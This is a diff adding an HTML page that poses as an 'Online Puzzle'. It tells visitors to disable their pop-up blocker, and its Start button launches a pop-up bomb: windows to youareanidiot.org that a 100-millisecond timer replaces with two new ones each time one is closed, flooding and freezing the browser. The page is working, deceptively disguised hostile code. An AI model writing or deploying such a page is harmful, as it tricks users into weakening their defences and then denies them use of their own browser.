@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<title>Online Puzzle</title>
+	</head>
+	<body>
+		<h1>First, in order to use this tool, you must turn off your pop-up blocker</h1>
+		<p>Test your pop-up blocker by pressing this button:</p><button onClick="dualtest()">Test</button>
+		<p>Start the puzzle:</p><button onClick="youredumb()">Start</button>
+		<script>
+			var yaai = [];
+			var emergencybreak;
+			function youredumb() {
+				yaai.push(window.open("http://www.youareanidiot.org/", "", "width=400, height=400"));
+				emergencybreak = setInterval(function() {
+					for (var i = 0; i < yaai.length; i++) {
+						if (yaai[i].closed) {
+							yaai[i] = {closed: false};
+							yaai.push(window.open("http://www.youareanidiot.org/", "", "width=400, height=400"));
+							yaai.push(window.open("http://www.youareanidiot.org/", "", "width=400, height=400"));
+						}
+					}
+				}, 100);
+			}
+			function dualtest() {
+				window.open("", "", "width=200, height=200");
+				window.open("", "", "width=200, height=200");
+			}
+		</script>
+	</body>
+</html>
